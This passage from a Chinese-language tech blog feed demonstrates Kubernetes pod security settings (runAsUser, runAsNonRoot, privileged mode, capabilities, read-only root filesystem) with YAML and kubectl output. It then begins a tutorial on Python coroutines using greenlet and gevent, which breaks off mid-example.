class="string">["/bin/sleep","999999"]</span></span><br></pre></td></tr></table></figure><p>启动pod</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % kubectl create -f pod-with-defaults.yaml </span><br><span class="line">pod/pod-with-defaults created</span><br></pre></td></tr></table></figure><p>查看这个容器中的用户ID和组ID以及它所属的用户组</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % kubectl exec pod-with-defaults -- id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</span><br></pre></td></tr></table></figure><p>发现这个容器在用户ID(uid)为0的用户，用户组ID(gid)为0的用户组下运行，它同样还属于一些其他的用户组。</p><h5 id="运行指定用户的pod"><a href="#运行指定用户的pod" class="headerlink" title="运行指定用户的pod"></a>运行指定用户的pod</h5><p>为了使用一个与镜像中不同的用户ID来运行pod，需要设置该pod的<code>securityContext.runAsUser</code>选项，可以通过以下代码来运行一个使用guest用户运行的容器。</p><p>创建一个名为<code>pod-as-user-guest</code>的YAML文件，内容如下，其中id405对应guest用户</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-as-user-guest</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">main</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">alpine</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">["/bin/sleep","999999"]</span></span><br><span class="line">    <span class="attr">securityContext:</span></span><br><span class="line">      <span class="attr">runAsUser:</span> <span class="number">405</span></span><br></pre></td></tr></table></figure><p>启动pod后查看，发现该容器在guest用户下运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % kubectl exec pod-as-user-guest -- id</span><br><span class="line">uid=405(guest) gid=100(users)</span><br></pre></td></tr></table></figure><h5 id="阻止容器以root用户运行"><a href="#阻止容器以root用户运行" class="headerlink" title="阻止容器以root用户运行"></a>阻止容器以root用户运行</h5><p>创建一个名为<code>pod-run-as-non-root</code>的YAML文件，内容如下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-run-as-non-root</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">main</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">alpine</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">["/bin/sleep","999999"]</span></span><br><span class="line">    <span class="attr">securityContext:</span></span><br><span class="line">      <span class="attr">runAsNonRoot:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>启动pod后查看pod信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pod pod-run-as-non-root     </span><br><span class="line">NAME                  READY   STATUS                       RESTARTS   AGE</span><br><span class="line">pod-run-as-non-root   0/1     CreateContainerConfigError   0          5m16s</span><br></pre></td></tr></table></figure><p>发现pod并没有运行，通过describe查看具体信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl describe pod pod-run-as-non-root      </span><br><span class="line">Name:         pod-run-as-non-root</span><br><span class="line">Namespace:    default</span><br><span class="line">Priority:     0</span><br><span class="line">Node:         docker-desktop/192.168.65.4</span><br><span class="line">Start Time:   Tue, 26 Oct 2021 13:53:32 +0800</span><br><span class="line">Labels:       &lt;none&gt;</span><br><span class="line">Annotations:  &lt;none&gt;</span><br><span class="line">Status:       Pending</span><br><span class="line">node.kubernetes.io/unreachable:NoExecute op=Exists for 300s</span><br><span class="line">Error: container has runAsNonRoot and image will run as root (pod: "pod-run-as-non-root_default", container: main)</span><br></pre></td></tr></table></figure><h5 id="运行使用特权模式的pod"><a href="#运行使用特权模式的pod" class="headerlink" title="运行使用特权模式的pod"></a>运行使用特权模式的pod</h5><p>为了获取宿主机内核的完整权限，该pod需要在特权模式下运行，这可以通过将容器的<code>securityContext</code>中的<code>privileged</code>设置为<code>true</code>实现。</p><p>创建一个名为<code>pod-privileged</code>的YAML文件，内容如下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-privileged</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">main</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">alpine</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">["/bin/sleep","999999"]</span></span><br><span class="line">    <span class="attr">securityContext:</span></span><br><span class="line">      <span class="attr">privileged:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>部署好这个pod之后，我们与之前部署的非特权模式的pod做对比。</p><p>首先使用之前的名为<code>pod-with-defaults</code>的pod，通过列出<code>/dev</code>目录下文件的方式查看非特权模式容器中的设备，如下所示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-with-defaults -- ls /dev</span><br><span class="line">core</span><br><span class="line">fd</span><br><span class="line">full</span><br><span class="line">mqueue</span><br><span class="line">null</span><br><span class="line">ptmx</span><br><span class="line">pts</span><br><span class="line">random</span><br><span class="line">shm</span><br><span class="line">stderr</span><br><span class="line">stdin</span><br><span class="line">stdout</span><br><span class="line">termination-log</span><br><span class="line">tty</span><br><span class="line">urandom</span><br><span class="line">zero</span><br></pre></td></tr></table></figure><p>接下来我们列出特权模式容器<code>/dev</code>目录下的文件，可以发现，特权模式的pod可以看到宿主节点上的所有设备。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-privileged -- ls /dev</span><br><span class="line">cachefiles</span><br><span class="line">core</span><br><span class="line">cpu</span><br><span class="line">cpu_dma_latency</span><br><span class="line">cuse</span><br><span class="line">fd</span><br><span class="line">full</span><br><span class="line">fuse</span><br><span class="line">hpet</span><br><span class="line">hwrng</span><br><span class="line">input</span><br><span class="line">kmsg</span><br><span class="line">loop-control</span><br><span class="line">loop0</span><br><span class="line">loop1</span><br><span class="line">loop2</span><br><span class="line">loop3</span><br><span class="line">loop4</span><br><span class="line">loop5</span><br><span class="line">loop6</span><br><span class="line">loop7</span><br><span class="line">mapper</span><br><span class="line">mem</span><br><span class="line">mqueue</span><br><span class="line">nbd0</span><br><span class="line">nbd1</span><br><span class="line">nbd10</span><br><span class="line">nbd11</span><br><span class="line">nbd2</span><br><span class="line">nbd3</span><br><span class="line">nbd4</span><br><span class="line">nbd5</span><br><span class="line">net</span><br><span class="line">null</span><br><span class="line">nvram</span><br><span class="line">port</span><br><span class="line">psaux</span><br><span class="line">ptmx</span><br><span class="line">pts</span><br><span class="line">ram0</span><br><span class="line">ram1</span><br><span class="line">ram10</span><br><span class="line">ram2</span><br><span class="line">ram3</span><br><span class="line">ram4</span><br><span class="line">ram5</span><br><span class="line">tty11</span><br><span class="line">tty12</span><br><span class="line">tty13</span><br><span class="line">tty14</span><br><span class="line">tty15</span><br><span class="line">tty16</span><br><span class="line">tty17</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h5 id="为容器单独添加内核功能"><a href="#为容器单独添加内核功能" class="headerlink" title="为容器单独添加内核功能"></a>为容器单独添加内核功能</h5><p>相比于让容器运行在特权模式下以给予其无限的权限，一个更安全的做法是只给予它是用真正需要的内核功能的权限，Kubernetes允许为特定的容器添加内核功能，或禁用部分内核功能，以允许对容器进行更加精细的权限控制，从而限制攻击之恶潜在侵入的一些影响。</p><p>例如，一个容器通常不允许修改系统时间，我们可以通过修改名为<code>pod-with-defaults</code>的pod中的时间来验证。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-with-defaults -- date +%T -s "12:00:00"</span><br><span class="line">date: can't set date: Operation not permitted</span><br></pre></td></tr></table></figure><p>如果需要允许容器修改系统时间，可以在容器的<code>securityContext.capabilities</code>里add一项名为<code>CAP_SYS_TIME</code>的功能。</p><p>首先创建一个名为<code>pod-add-settime-capability</code>的YAML文件，内容如下。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-add-settime-capability</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">main</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">alpine</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">["/bin/sleep","999999"]</span></span><br><span class="line">    <span class="attr">securityContext:</span></span><br><span class="line">      <span class="attr">capabilities:</span></span><br><span class="line">        <span class="attr">add:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">SYS_TIME</span></span><br></pre></td></tr></table></figure><p>注意Linux内核功能的名称通常以<code>CAP_</code>开头，但是在<code>pod spec</code>中指定内核功能时，必须省略<code>CAP_</code>前缀</p><p>启动好pod之后，在新的容器中运行同样的命令，发现可以成功修改系统时间</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-add-settime-capability -- date +%T -s "12:00:00" </span><br><span class="line">12:00:00</span><br><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-add-settime-capability -- date                  </span><br><span class="line">Tue Oct 26 12:00:05 UTC 2021</span><br></pre></td></tr></table></figure><h5 id="在容器中禁用内核功能"><a href="#在容器中禁用内核功能" class="headerlink" title="在容器中禁用内核功能"></a>在容器中禁用内核功能</h5><p>默认情况下，容器拥有<code>CAP_CHOWN</code>权限，允许进程修改文件系统中文件的所有者。如下示例，可以在<code>pod-with-defaults</code>中将<code>/tmp</code>目录的所有者改为guest用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-with-defaults -- chown guest /tmp</span><br><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-with-defaults -- ls -la / | grep tmp</span><br><span class="line">drwxrwxrwt    1 guest    root          4096 Aug 27 11:05 tmp</span><br></pre></td></tr></table></figure><p>为了阻止容器的这种行为，可以在容器的<code>securityContext.capabilities</code>里drop一项名为<code>CHOWN</code>的功能</p><p>首先创建一个名为<code>pod-drop-chown-capability</code>的YAML文件，内容如下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-drop-chown-capability</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">main</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">alpine</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">["/bin/sleep","999999"]</span></span><br><span class="line">    <span class="attr">securityContext:</span></span><br><span class="line">      <span class="attr">capabilities:</span></span><br><span class="line">        <span class="attr">drop:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">CHOWN</span></span><br></pre></td></tr></table></figure><p>禁用<code>CHOWN</code>内核功能后，则不允许在这个pod中修改文件所有者</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-drop-chown-capability -- chown guest /tmp</span><br><span class="line">chown: /tmp: Operation not permitted</span><br><span class="line">command terminated with exit code 1</span><br></pre></td></tr></table></figure><h5 id="阻止对容器根文件系统的写入"><a href="#阻止对容器根文件系统的写入" class="headerlink" title="阻止对容器根文件系统的写入"></a>阻止对容器根文件系统的写入</h5><p>因为安全原因，可以需要组织容器中的进程对容器的根文件系统进行写入，仅允许他们写入挂载的存储卷。我们可以通过将容器的<code>securityContext.readOnlyRootFilesystem</code>设置为true来实现。</p><p>创建一个名为<code>pod-with-readonly-filesystem</code>的YAML文件，内容如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: pod-with-readonly-filesystem</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - name: main</span><br><span class="line">    image: alpine</span><br><span class="line">    command: ["/bin/sleep","999999"]</span><br><span class="line">    securityContext:</span><br><span class="line">      readOnlyRootFilesystem: true</span><br><span class="line">    volumeMounts:</span><br><span class="line">    - name: my-volume</span><br><span class="line">      mountPath: /volume</span><br><span class="line">      readOnly: false</span><br><span class="line">  volumes:</span><br><span class="line">  - name: my-volume</span><br><span class="line">    emptyDir:</span><br></pre></td></tr></table></figure><p>这个pod中的容器虽然以root用户运行，拥有<code>/</code>目录的写权限，但在该目录下写入一个文件会失败，如下所示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-with-readonly-filesystem -- touch /new-file</span><br><span class="line">touch: /new-file: Read-only file system</span><br><span class="line">command terminated with exit code 1</span><br></pre></td></tr></table></figure><p>但是对于挂载的卷的写入时允许的，如下所示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-with-readonly-filesystem -- touch /volume/new-file</span><br><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-with-readonly-filesystem -- ls -la /volume/new-file</span><br><span class="line">-rw-r--r--    1 root     root             0 Oct 26 06:59 /volume/new-file</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;机制说明&quot;&gt;&lt;a href=&quot;#机制说明&quot; class=&quot;headerlink&quot; title=&quot;机制说明&quot;&gt;&lt;/a&gt;机制说明&lt;/h4&gt;&lt;p&gt;Kubernetes作为一个分布式集群的管理工具，保证集群的安全性是一个很重要的任务，&lt;code&gt;API Server&lt;/c
      
    
    </summary>
    
    
      <category term="虚拟化" scheme="elssm.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Python协程</title>
    <link href="elssm.github.io/2021/10/24/Python%E5%8D%8F%E7%A8%8B/"/>
    <id>elssm.github.io/2021/10/24/Python协程/</id>
    <published>2021-10-24T03:56:55.000Z</published>
    <updated>2021-10-24T06:49:20.365Z</updated>
    
    <content type="html"><![CDATA[<h4 id="协程概念"><a href="#协程概念" class="headerlink" title="协程概念"></a>协程概念</h4><p>协程是一种用户态的轻量级线程，协程的调度完全由用户控制。协程拥有自己的寄存器上下文和栈。协程调度切换时，将寄存器上下文和栈保存到其他地方，在切回来的时候，恢复先前保存的寄存器上下文和栈，直接操作栈则基本没有内核切换的开销，可以不加锁的访问全局变量，所以上下文的切换非常快。与线程相比，协程更轻量。一个Python线程大概占用8M内存，而一个协程只占用1KB不到内存。协程更适用于IO密集型的应用。</p><h4 id="greenlet模块"><a href="#greenlet模块" class="headerlink" title="greenlet模块"></a>greenlet模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> greenlet <span class="keyword">import</span> greenlet</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start eating"</span>)</span><br><span class="line">    g2.switch()</span><br><span class="line">    print(<span class="string">"finished eating"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sleep</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start sleeping"</span>)</span><br><span class="line">    print(<span class="string">"finished sleeping"</span>)</span><br><span class="line">    g1.switch()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">g1 = greenlet(eat)</span><br><span class="line">g2 = greenlet(sleep)</span><br><span class="line">g1.switch()</span><br></pre></td></tr></table></figure><p>在上面的代码中，创建了两个协程对象，分别是<code>g1</code>和<code>g2</code>，分别对应的是<code>eat()函数</code>和<code>sleep()</code>函数。通过使用<code>greenlet</code>的<code>switch</code>方法可以切换协程。这里我们先调用<code>g1</code>的<code>switch方法</code>，此时<code>eat()</code>函数被执行，并打印出<code>start eating</code>。接下来是<code>g2</code>的<code>switch方法</code>被调用，此时执行<code>sleep()</code>函数，依次打印<code>start sleeping</code>和<code>finished sleeping</code>，之后又调用了<code>g1</code>的<code>switch方法</code>，回到<code>eat()函数中</code>，打印出<code>finished eating</code>。程序执行结束。这个时候我们就完成了两个协程之间的切换。代码的输出为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">start eating</span><br><span class="line">start sleeping</span><br><span class="line">finished sleeping</span><br><span class="line">finished eating</span><br></pre></td></tr></table></figure><h4 id="gevent模块"><a href="#gevent模块" class="headerlink" title="gevent模块"></a>gevent模块</h4><p>gevent是第三方库，通过greenlet实现协程。然而当一个greenlet遇到IO操作时，比如访问网络，就自动切换到其他的greenlet，等到IO操作完成，再在适当的时候切换回来继续执行。由于IO操作非常耗时，经常使程序处于等待状态，有了gevent为我们自动切换协程，就保证总有greenlet在运行，而不是等待IO。</p><h5 id="创建协程任务"><a href="#创建协程任务" class="headerlink" title="创建协程任务"></a>创建协程任务</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start eating"</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"finished eating"</span>)</span><br><span class="line"></span><br><span class="line">g1 = gevent.spawn(eat)  <span class="comment"># 创造一个协程任务</span></span><br><span class="line">gevent.sleep(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>在<code>gevent</code>模块中，通过<code>gevent.spawn</code>就可以创建一个协程任务。如果需要交替之行的话，需要使用<code>gevent.sleep</code>交出控制权。这个时候，就会转去执行<code>eat</code>函数。</p><h5 id="阻塞等待协程完成"><a href="#阻塞等待协程完成" class="headerlink" title="阻塞等待协程完成"></a>阻塞等待协程完成</h5><p>使用<code>join</code>方法，可以阻塞等待一个协程的结束。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start eating"</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    print(<span class="string">"finished eating"</span>)</span><br><span class="line"></span><br><span class="line">g1 = gevent.spawn(eat)  </span><br><span class="line">g1.join()</span><br></pre></td></tr></table></figure><h5 id="阻塞等待多个协程"><a href="#阻塞等待多个协程" class="headerlink" title="阻塞等待多个协程"></a>阻塞等待多个协程</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start eating"</span>)</span><br><span class="line">    gevent.sleep(<span class="number">3</span>)</span><br><span class="line">    print(<span class="string">"finished eating"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sleep</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start sleeping"</span>)</span><br><span class="line">    gevent.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"finished sleeping"</span>)</span><br><span class="line"></span><br><span class="line">g1 = gevent.spawn(eat)  </span><br><span class="line">g2 = gevent.spawn(sleep)</span><br><span class="line">g1.join()</span><br><span class="line">g2.join()</span><br></pre></td></tr></table></figure><p>这里需要注意在多个协程中，不能使用<code>time.sleep</code>，这样将会导致协程是同步执行的。输出如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">start eating</span><br><span class="line">finished eating</span><br><span class="line">start sleeping</span><br><span class="line">finished sleeping</span><br></pre></td></tr></table></figure><p>因此需要使用<code>gevent.sleep</code>，这样才能引起协程之间的切换。输出如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">start eating</span><br><span class="line">start sleeping</span><br><span class="line">finished sleeping</span><br><span class="line">finished eating</span><br></pre></td></tr></table></figure><p>除此之外，对于多个协程的阻塞，我们也可以不用对于每一个协程采用<code>join</code>方法， 在<code>gevent</code>中提供了<code>joinall</code>方法，在该方法中，只需要传一个协程的列表即可，因此对于上面代码最后两行，我们可以使用下面代码替换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gevent.joinall([g1,g2])</span><br></pre></td></tr></table></figure><h5 id="gevent中的monkey模块"><a href="#gevent中的monkey模块" class="headerlink" title="gevent中的monkey模块"></a>gevent中的monkey模块</h5><p>monkey模块可以使我们在不修改原来使用的python标准库函数的程序的情况下，将程序转换成可以使用gevent框架的异步程序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">monkey.patch_all()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start eating"</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    print(<span class="string">"finished eating"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sleep</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start 